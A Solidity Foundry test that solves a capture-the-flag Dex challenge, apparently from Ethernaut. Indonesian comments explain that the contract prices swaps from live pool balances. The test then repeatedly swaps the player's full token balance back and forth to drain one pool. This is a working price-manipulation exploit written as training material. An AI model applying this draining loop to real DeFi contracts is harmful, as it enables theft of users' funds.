// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Dex} from "src/levels/Dex.sol";
import {DexFactory} from "src/levels/DexFactory.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexSolve is Test {
    DexFactory factory;
    Dex instance;
    address player = address(0xBEEF);
    address token1;
    address token2;

    function setUp() public {
        factory = new DexFactory();
        vm.deal(player, 10 ether);
        instance = Dex(factory.createInstance(player));
        token1 = instance.token1();
        token2 = instance.token2();
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // Dex.approve() memberi allowance Dex atas kedua token player
        instance.approve(address(instance), type(uint256).max);
        // getSwapPrice = amount * bal(to) / bal(from): harga dihitung dari
        // saldo pool SAAT INI, dan swap menggeser rasio. Swap bolak-balik
        // dengan seluruh saldo menguntungkan penyerang tiap putaran.
        // Jumlah dibatasi saldo pool token `from` supaya swapAmount tidak
        // melebihi saldo pool token `to` (kalau tidak, transferFrom revert).
        for (uint256 i = 0; i < 30; i++) {
            if (
                IERC20(token1).balanceOf(address(instance)) == 0 ||
                IERC20(token2).balanceOf(address(instance)) == 0
            ) break;
            uint256 bal1 = IERC20(token1).balanceOf(player);
            if (bal1 > 0) {
                uint256 poolFrom = IERC20(token1).balanceOf(address(instance));
                uint256 amount = bal1 < poolFrom ? bal1 : poolFrom;
                if (amount > 0) instance.swap(token1, token2, amount);
            }
            if (
                IERC20(token1).balanceOf(address(instance)) == 0 ||
                IERC20(token2).balanceOf(address(instance)) == 0
            ) break;
            uint256 bal2 = IERC20(token2).balanceOf(player);
            if (bal2 > 0) {
                uint256 poolFrom = IERC20(token2).balanceOf(address(instance));
                uint256 amount = bal2 < poolFrom ? bal2 : poolFrom;
                if (amount > 0) instance.swap(token2, token1, amount);
            }
        }
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
